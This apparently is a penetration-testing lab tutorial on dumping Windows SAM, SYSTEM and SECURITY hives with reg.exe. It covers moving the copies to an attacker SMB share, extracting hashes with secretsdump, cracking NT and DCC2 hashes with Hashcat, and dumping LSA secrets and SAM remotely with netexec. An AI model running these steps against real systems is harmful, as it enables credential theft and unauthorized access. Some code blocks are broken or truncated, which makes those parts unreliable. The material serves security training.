With administrative access to a Windows system, we can attempt to quickly dump the files associated with the SAM database, transfer them to our attack host, and begin cracking the hashes offline.

## Registry hives
There are three registry hives we can copy if we have local administrative access to a target system, each serving a specific purpose when it comes to dumping and cracking password hashes. A brief description of each is provided in the table below:

|Registry Hive|Description|
|---|---|
|`HKLM\SAM`|Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords.|
|`HKLM\SYSTEM`|Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes.|
|`HKLM\SECURITY`|Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more.|
Theses files are located at `C:\Windows\System32\config`
*We can back up these hives using the `reg.exe` utility*.

#### Using reg.exe to copy registry hives
By launching `cmd.exe` with administrative privileges, we can use `reg.exe` to save copies of the registry hives. Run the following commands:

```cmd-session
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.exe

The operation completed successfully.
```

If we're only interested in dumping the hashes of local users, we need only `HKLM\SAM` and `HKLM\SYSTEM`. However, it's often useful to save `HKLM\SECURITY` as well, since it can contain cached domain user credentials on domain-joined systems, along with other valuable data. Once these hives are saved offline, we can use various methods to transfer them to our attack host. In this case, we'll use Impacket's [smbserver](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) in combination with some basic CMD commands to move the hive copies to a share hosted on our attacker machine.

#### Creating a share with smbserver
To create the share, we simply run `smbserver.py -smb2support`, specify a name for the share (e.g., `CompData`), and point to the local directory on our attack host where the hive copies will be stored (e.g., `/home/ltnbob/Documents`).

```shell
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/

Once the share is running on our attack host, we can use the `move` command on the Windows target to transfer the hive copies to the share.

#### Moving hive copies to share
```cmd
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
```

```shell
> ls

sam.save  security.save  system.save
```

## Dumping hashes with secretsdump
One particularly useful tool for dumping hashes offline is Impacket's `secretsdump`. Impacket is included in most modern penetration testing distributions.

Using `secretsdump` is straightforward. We simply run the script with Python and specify each of the hive files we retrieved from the target host.

```shell
 python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

```shell

[*] Cleaning up... 
```

Here we see that `secretsdump` successfully dumped the `local` SAM hashes, along with data from `hklm\security`, including cached domain logon information and LSA secrets such as the machine and user keys for DPAPI.

Notice that the first step `secretsdump` performs is retrieving the `system bootkey` before proceeding to dump the `local SAM hashes`. This is necessary because the bootkey is used to encrypt and decrypt the SAM database. Without it, the hashes cannot be decrypted — which is why having copies of the relevant registry hives, as discussed earlier, is crucial.

Moving on, notice the following line:
```shell
Dumping local SAM hashes (uid:rid:lmhash:nthash)
```

This tells us how to interpret the output and which hashes we can attempt to crack.
With this in mind, we can copy the NT hashes associated with each user account into a text file and begin cracking passwords. It is helpful to note which hash corresponds to which user to keep track of the results.

## Cracking hashes with Hashcat

#### Storing the NT hashes
```shell
> sudo vim hashestocrack.txt

64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2
```

#### Running Hashcat against NT hashes
```shell
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

It is very common for users to reuse passwords across different work and personal accounts. Understanding and applying this technique can be valuable during assessments. We will benefit from it anytime we encounter a vulnerable Windows system and gain administrative rights to dump the SAM database.

Keep in mind that this is a well-known technique, and administrators may have implemented safeguards to detect or prevent it. Several detection and mitigation strategies are [documented](https://attack.mitre.org/techniques/T1003/002/) within the MITRE ATT&CK framework.

## DCC2 hashes
As mentioned previously, `hklm\security` contains cached domain logon information, specifically in the form of DCC2 hashes. These are local, hashed copies of network credential hashes. An example is:

```
inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
```

#### Hashcat command
```shell
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
```

## DPAPI
In addition to the DCC2 hashes, we previously saw that the `machine and user keys` for `DPAPI` were also dumped from `hklm\security`. The Data Protection Application Programming Interface, or [DPAPI](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection), is a set of APIs in Windows operating systems used to encrypt and decrypt data blobs on a per-user basis. These blobs are utilized by various Windows OS features and third-party applications. Below are just a few examples of applications that use DPAPI and how they use it:

|Applications|Use of DPAPI|
|---|---|
|`Internet Explorer`|Password form auto-completion data (username and password for saved sites).|
|`Google Chrome`|Password form auto-completion data (username and password for saved sites).|
|`Outlook`|Passwords for email accounts.|
|`Remote Desktop Connection`|Saved credentials for connections to remote machines.|
|`Credential Manager`|Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more.|

DPAPI encrypted credentials can be decrypted manually with tools like Impacket's [dpapi](https://github.com/fortra/impacket/blob/master/examples/dpapi.py), [mimikatz](https://github.com/gentilkiwi/mimikatz), or remotely with [DonPAPI](https://github.com/login-securite/DonPAPI).

```cmd

## Remote dumping & LSA secrets considerations
With access to credentials that have `local administrator privileges`, it is also possible to target LSA secrets over the network. This may allow us to extract credentials from running services, scheduled tasks, or applications that store passwords using LSA secrets.
#### Dumping LSA secrets remotely
```shell
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```
#### Dumping SAM Remotely
```shell
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```
